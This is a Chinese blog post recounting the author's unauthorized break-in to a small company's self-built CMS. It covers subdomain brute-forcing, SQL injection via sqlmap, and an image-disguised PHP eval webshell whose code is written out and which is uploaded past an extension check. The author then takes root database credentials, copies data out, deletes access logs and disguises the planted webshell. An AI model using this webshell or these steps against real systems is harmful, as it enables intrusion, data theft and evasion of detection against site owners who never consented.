---
title: 某cms渗透菜鸡复盘
tags:
- 日常
- blog
- 安全技术
categories:
- 技术
keywords: 某cms渗透菜鸡复盘
description: 某cms渗透菜鸡复盘
top_img: https://img.gumengya.com/api/mc/16.jpg
comments: false
cover: https://img.gumengya.com/api/mc/16.jpg
copyright: true
copyright_author: sikuai
copyright_author_href: https://sikuai2333.github.io
highlight_shrink: false
date: 2023-07-30 08:23:31
updated: null
copyright_url: null
copyright_info: null
aside: null
abcjs: null
---
# 1. 过程复现

## 1.1. 域名爆破

挑选受害者，空间看见\*云的宣传，遂动手。\
主站是wordpress新版，插件也没有漏洞，扫了一下端口，没什么有用的，只知道开了3306数据库，放弃爆破密码，看到有一篇文章提到自写的cms，应该好下手。\
xxxx.work通过layer子域名爆破得到众多域名，大致看了一下，都是开源项目或者重定向到主站，瞄了一眼cms.xxxx.work，嗯，很像之前宣传的flask写的后台登录，开工。

## 1.2. sql注入

文章自己提到进行了安全检查，其实有点担心修复了常见漏洞，这让我个菜鸡很难办啊，好在只是检查了xss（应该是评论之类的防xss），点击文章，有个点赞评论功能，F12看一眼，提交了一个id，复制链接到sqlmap直接跑，接着看功能。

## 1.3. 图片马

有一个个人中心的功能，注册的时候可以上传图像，嗯，现做一个图片马，用burpsuit抓包就能绕后缀。

```bash
copy 001.jpeg/b + test.php/a 2.jpg
```

因为是php，所以小马是

```php
<?php eval($_POST['yuer']); ?>
```

准备完毕，上传抓包修改后缀，能正常上传，右键头像得到图片链接，php后缀大喜，用蚁剑连接，成功进入，同时sqlmap也跑出来有sql注入，不过用处不是很大了。

## 1.4. 获取数据库

防止漏洞被修先上传一个大马，显示有点问题，以前钓鱼网站就能正常显示，无所谓了，先进去找找配置文件，记得之前有个flask写的登录，打开获取账户密码，其实这个cms也有配置文件，也能看到账户密码，没想到居然是root权限，服务器3306对外开放，登录，转移数据doge。

## 1.5. 宝塔建站

网站是宝塔面板，试了一些提权没能绕过，期间逛了逛其他目录，发现他们把整站打包放在了/wwwroot，复制一份到cms下面，直链下载下来代码审查，顺手到/wwwlog下面把cms的访问成功和失败的记录都给删掉，蚁剑挂了代理所以即使留下最后一条操作也是代理IP，顺便给大马改个名，伪装成正常文件。

## 1.6. 其他

* 密码使用md5加盐，没什么有用的信息
* 有hack，kali之类的用户名，可能是自测也可能是日烂了
* 宝塔没法提权，止步于此挺遗憾的
* 通知了管理员，坐等更新
